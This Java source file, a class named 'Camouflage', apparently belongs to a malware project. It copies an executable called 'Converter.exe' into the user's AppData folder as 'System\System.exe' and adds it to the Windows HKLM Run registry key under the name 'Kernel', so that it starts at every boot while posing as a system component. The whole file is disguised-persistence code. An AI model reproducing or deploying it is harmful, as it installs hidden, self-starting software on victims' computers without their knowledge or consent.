package com.sassouki.copyme;

import java.io.File;
import java.io.IOException;

public class Camouflage {
	private final static String prefix="reg add  \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\""+"  /v Kernel /t REG_SZ /d ";

	public void addToRegistry(String crawlerPath){
		File path=new File(System.getProperty("java.io.tmpdir")+"/added");
		if(!path.exists()){
		try {
			Process reg = Runtime.getRuntime().exec(prefix+crawlerPath);
			
			path.createNewFile();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		}
	}
public void copySoftware(){
	Copy soft = new Copy();
	try{
		String Path = System.getProperty("java.io.tmpdir");
		String AppData=new File(Path).getParentFile().getParentFile().getCanonicalPath();
		String Startup= AppData+"\\Roaming\\";
		boolean f = new File(Startup+"\\System").mkdirs();
		File finalDestination = new File(Startup+"\\System\\System.exe");
		if(!finalDestination.exists()){
		soft.copyFile(new File("Converter.exe"),finalDestination );
		addToRegistry(finalDestination.getCanonicalPath());
		
}
	} catch (Exception ex) {
        ex.printStackTrace();
    }
	
}
}

